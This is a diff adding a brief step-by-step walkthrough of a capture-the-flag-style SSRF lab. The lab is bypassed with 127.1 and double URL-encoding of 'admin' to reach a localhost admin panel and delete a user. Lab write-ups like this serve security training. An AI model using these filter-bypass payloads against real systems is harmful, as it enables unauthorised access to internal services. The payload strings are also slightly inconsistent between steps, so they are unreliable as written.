@@ -1,0 +1,22 @@
+escaping weak defence mechanism 
+
+
+Lab: SSRF with blacklist-based input filter
+TASK" This lab has a stock check feature which fetches data from an internal system.
+
+To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+
+The developer has deployed two weak anti-SSRF defenses that you will need to bypass. "
+
+
+our target to bypass that weak security filter
+
+steps to solve the lab
+
+
+step 1 = navigate send a request to stockapi and intercept in Burp
+step 2 = observe the response comes from http://localhost/admin 
+step 3 = change that http://localhost/admin to http://127.1/admin 
+step 4 = url encode that admin directory to %2561%2564%256D%2569%256E and send the total payload http://127.1%2561%2564%256D%2569%256E
+step 5 = then delete user carlos by sending a post request to http%3A%2F%2F127.1%2F%2561%2564%256D%2569%256E/delete?username=carlos
+step 6 = solved the lab
